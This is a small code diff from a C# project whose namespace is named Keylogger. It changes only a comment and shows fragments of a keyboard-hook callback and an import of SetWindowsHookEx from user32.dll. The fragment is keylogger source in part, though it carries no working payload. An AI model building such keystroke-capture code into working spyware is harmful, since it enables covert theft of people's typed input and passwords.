@@ -156,7 +156,7 @@ namespace Keylogger
             return CallNextHookEx(_hookID, nCode, wParam, lParam);
         }
 
-        //These Dll's will handle the hooks. Yaaar mateys! :(
+        //These Dll's will handle the hooks. Yaaar mateys!
 
         [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
         private static extern IntPtr SetWindowsHookEx(int idHook,
